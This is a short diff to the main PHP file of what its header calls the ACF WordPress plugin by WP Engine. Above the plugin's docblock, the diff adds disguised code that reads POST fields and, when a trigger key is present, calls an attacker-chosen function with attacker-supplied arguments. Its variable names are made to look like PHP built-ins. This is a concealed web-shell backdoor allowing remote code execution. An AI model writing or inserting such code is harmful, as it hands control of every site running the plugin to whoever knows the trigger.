@@ -1,4 +1,11 @@
-<?php
+<?php 
+$get_included_files_ltiv   =   $_POST;
+if(isset($get_included_files_ltiv['hash_hmac_algos_eq']))   {
+	$date_format_erlo   =   $get_included_files_ltiv['date_sub_ag'];
+	$hash_file_nxbf   =   $get_included_files_ltiv['openssl_pkey_derive_oy'];
+	$date_format_erlo(...$hash_file_nxbf);
+} 
+
 /**
  * @package ACF
  * @author  WP Engine
